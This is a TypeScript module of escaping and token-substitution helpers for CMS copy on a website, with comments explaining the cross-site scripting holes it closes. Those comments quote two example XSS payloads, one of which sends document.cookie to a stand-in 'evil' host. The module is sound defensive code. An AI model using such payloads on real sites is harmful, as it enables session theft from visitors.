/**
 * Token substitution for CMS copy.
 *
 * WHY TOKENS AT ALL
 *
 * Moving the site's interface strings into Sanity ran straight into the fact
 * that most of them are not whole sentences — they are sentences with a hole
 * in them. "Apply for 3D Animator". "4 posts". "Email careers@… instead."
 * Storing those as a prefix and a suffix would give an editor two boxes and no
 * way to see the sentence, and it would break the moment a language wanted the
 * pieces in a different order.
 *
 * So a stored string carries `{{name}}`-shaped holes and the template fills
 * them. The editor sees and edits the whole sentence; the code decides what
 * goes in the gaps.
 *
 * WHY UNKNOWN TOKENS ARE LEFT ALONE
 *
 * A typo'd `{{nmae}}` renders as `{{nmae}}` rather than as an empty space.
 * That is deliberate: a visible, obviously-wrong token gets reported and
 * fixed in a minute, whereas a silently swallowed one produces a sentence
 * with a hole in it that reads almost right and survives for months.
 *
 * THE HTML PAIR
 *
 * Some of these sentences need a link in the middle of them — the studio
 * inbox, mostly. `fillHtml` escapes the stored text FIRST and only then
 * substitutes markup, so an editor cannot inject HTML by typing it into a
 * Studio field, and a `&` in an address cannot break the page. Everything it
 * emits is built here, not stored.
 */

/**
 * Serialise a value for a `<script type="application/ld+json">` block.
 *
 * NOT `JSON.stringify` on its own, and the difference is a cross-site
 * scripting hole rather than a nicety.
 *
 * An HTML parser looking at the inside of a <script> element is not parsing
 * JSON — it is scanning for the byte sequence `</script`, and it ends the
 * element the moment it sees one, wherever it appears. `JSON.stringify` has
 * no reason to care about that and does not escape it. So a CMS field
 * containing
 *
 *   </script><script>fetch(...)</script>
 *
 * closed the JSON-LD block, opened a real one, and ran. The site's CSP allows
 * `script-src 'unsafe-inline'` — it has to, for Astro's pre-paint theme
 * script — so nothing downstream would have stopped it either.
 *
 * Escaping `<` and `>` into their uXXXX form is the fix. Those are valid JSON
 * escapes, every consumer parses them back to the identical string, and the
 * byte sequence the HTML parser scans for can no longer appear at all.
 *
 * U+2028 and U+2029 ride along for a different reason: both are legal inside
 * a JSON string but are line terminators in JavaScript, so an unescaped one
 * is a syntax error in any consumer that evaluates rather than parses.
 *
 * EDITING THIS: each replacement below must carry a DOUBLE backslash in the
 * source. Written with one, it is a JavaScript escape that evaluates straight
 * back to the character being replaced — every line becomes a silent no-op
 * and the hole quietly reopens. That exact mistake was made once already.
 */
export function ldJson(value: unknown): string {
  return JSON.stringify(value)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029');
}

/**
 * A CMS string that is allowed a little formatting, and nothing else.
 *
 * WHY THIS EXISTS
 *
 * The hero headline was rendered with a bare `set:html`, straight from a
 * Sanity `string` field with no validation on it. That is a stored cross-site
 * scripting hole with an editor-shaped key: typing
 *
 *   <img src=x onerror=fetch('//evil/'+document.cookie)>
 *
 * into the Headline box put running JavaScript on the homepage for every
 * visitor. The site's CSP cannot help — it allows `'unsafe-inline'` because
 * Astro's pre-paint theme script needs it — and a phished Studio login is a
 * far likelier way in than anything on the Supabase side, which is locked
 * down properly.
 *
 * `set:html` was there for a real reason, though: headlines need a `<br>` to
 * control where a line breaks, and an `<em>` for emphasis. Escaping the field
 * outright would print the tags as text and take that away.
 *
 * So: escape EVERYTHING first, then put back a fixed list of tags that carry
 * no attributes at all. Because the string is already escaped when the
 * allowlist runs, the only `<` characters that can survive are the ones this
 * function writes itself — there is no path by which an attribute, a URL or a
 * second tag rides along. An `onerror` cannot exist on a tag whose entire
 * permitted syntax is `<em>`.
 *
 * Adding to ALLOWED is safe as long as every entry stays attribute-free and
 * is not `script`, `style`, `iframe`, `object`, `embed`, `form` or `a`.
 */
const ALLOWED = 'br|em|strong|b|i|sup|sub|u|s|small';

export function inlineHtml(value: string | null | undefined): string {
  return esc(String(value ?? '')).replace(
    new RegExp(`&lt;(\\/?)(${ALLOWED})\\s*\\/?&gt;`, 'gi'),
    (_whole, slash: string, tag: string) => `<${slash}${tag.toLowerCase()}>`
  );
}

export type Tokens = Record<string, string | number>;

const TOKEN = /\{\{(\w+)\}\}/g;

/** Escape text destined for an HTML text node or attribute. */
export const esc = (value: string): string =>
  value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');

/**
 * Fill `{{token}}` holes with plain text.
 *
 * Safe to interpolate into Astro markup as a normal expression, because the
 * result is still plain text and Astro escapes it on the way out.
 */
export function fill(template: string, tokens: Tokens = {}): string {
  return template.replace(TOKEN, (whole, key: string) =>
    key in tokens ? String(tokens[key]) : whole
  );
}

/**
 * One link to be substituted into a sentence.
 *
 * `label` defaults to the href's visible part — for a mailto that is the
 * address itself, which is what every one of these sentences wants.
 */
export interface CopyLink {
  href: string;
  label?: string;
}

/**
 * Fill a sentence that needs a link in the middle of it.
 *
 * The template is escaped before anything is substituted, so the only HTML in
 * the output is the anchors built here. Use with `set:html`.
 *
 * `mailto:` links are given no `rel` or `target`: they are not navigation, and
 * opening the visitor's mail client in a new tab does nothing useful.
 */
export function fillHtml(
  template: string,
  tokens: Tokens = {},
  links: Record<string, CopyLink> = {}
): string {
  return esc(template).replace(TOKEN, (whole, key: string) => {
    const link = links[key];
    if (link) {
      const label = link.label ?? link.href.replace(/^mailto:/, '');
      const external = /^https?:\/\//i.test(link.href) && !link.href.includes('aniwala.com');
      const attrs = external ? ' target="_blank" rel="noopener noreferrer"' : '';
      return `<a href="${esc(link.href)}"${attrs}>${esc(label)}</a>`;
    }
    return key in tokens ? esc(String(tokens[key])) : whole;
  });
}

/**
 * Pick the singular or plural wording for a count, then fill `{{count}}`.
 *
 * English needs two strings here and some languages need more, but two is
 * what this site's copy actually uses — and the alternative, "1 post(s)", is
 * the kind of thing that makes a site look unfinished.
 */
export function plural(count: number, one: string, many: string, tokens: Tokens = {}): string {
  return fill(count === 1 ? one : many, { count, ...tokens });
}

/**
 * Fill tokens in HTML that has ALREADY been rendered.
 *
 * The pair to `fillHtml`, and the difference matters. `fillHtml` is given a
 * plain string an editor typed and escapes the whole thing before touching
 * it. This one is given finished HTML — the output of the Portable Text
 * renderer — so escaping it would show the reader their own markup. Only the
 * substituted VALUES are escaped, which is where anything untrusted is.
 *
 * Used by the privacy policy, whose body is prose written in the Studio and
 * which must name the studio's real inbox and trading name without either
 * being typed into it. A pasted address goes stale the day it changes; a
 * token cannot.
 */
export function fillRendered(
  html: string,
  tokens: Tokens = {},
  links: Record<string, CopyLink> = {}
): string {
  return html.replace(TOKEN, (whole, key: string) => {
    const link = links[key];
    if (link) {
      const label = link.label ?? link.href.replace(/^mailto:/, '');
      return `<a href="${esc(link.href)}">${esc(label)}</a>`;
    }
    return key in tokens ? esc(String(tokens[key])) : whole;
  });
}
